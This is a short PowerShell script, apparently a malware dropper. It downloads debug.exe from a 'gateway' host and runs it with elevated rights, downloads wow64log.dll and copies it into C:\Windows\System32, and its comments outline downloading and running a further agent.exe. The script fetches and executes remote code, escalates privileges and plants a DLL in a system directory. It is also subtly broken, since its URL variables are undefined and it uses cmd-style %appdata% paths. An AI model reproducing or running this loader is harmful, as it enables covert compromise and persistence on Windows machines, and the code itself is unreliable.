


$gateway = "http://gateway" 


# 1 / debug.exe 

Invoke-WebRequest $gatewaydebug -OutFile %appdata%\agent\debug.exe 
Start-Process -FilePath "%appdata%\agent\debug.exe" -Verb runAs


# 3 / Download wow64log.dll 
Invoke-WebRequest $gatewaydll -OutFile %appdata%\wow64log.dll

# 4 / Move to System32
Copy-Item -force %appdata%/wow64log.dll C:\Windows\System32\

# 5 / Prepare agent installation  
# 6 / create %appdata%/agent
# 7 / download agent in %appdata%/agent.exe 
# 8 / run agent.exe 

